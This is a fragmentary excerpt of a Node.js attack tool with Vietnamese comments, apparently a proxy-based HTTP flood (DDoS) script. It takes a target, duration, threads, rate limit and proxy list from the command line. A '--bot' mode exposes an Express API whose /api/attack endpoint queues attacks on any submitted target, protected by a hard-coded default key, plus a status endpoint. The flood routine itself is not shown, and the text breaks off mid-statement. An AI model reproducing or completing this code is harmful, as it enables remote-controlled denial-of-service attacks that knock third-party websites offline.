...
const proxyfile = process.argv[7] || 'vn.txt';
const target = process.argv[3];
const time = process.argv[4] || 60;
const threads = parseInt(process.argv[5]) || 10;
const ratelimit = parseInt(process.argv[6]) || 500;
...
// BỎ QUA CHECK NẾU CHẠY BOT MODE
...
if (process.argv.includes('--bot')) {
    ...
    // API Key mặc định
    const API_KEY = process.env.API_KEY || 'quancncmiku';
    ...
    app.post('/api/attack', auth, (req, res) => {
        const { target, time, threads, rate } = req.body;
        
        if (!target || !time) {
            return res.status(400).json({ error: 'Missing target or time' });
        }
        
        // Lưu thông tin attack
        const attackId = Date.now();
        
        // Ghi log để worker đọc
        fs.writeFileSync('attack_task.json', JSON.stringify({
            attackId,
            target,
            time,
            threads: threads || 10,
        ...
        res.json({ 
            success: true, 
            attackId,
            message: `Attack started on ${target}`
        });
    });
    ...
    app.get('/api/status', auth, (req, res) => {
        res.json({
            active_attacks: cluster.isMaster ? 1 : 0,
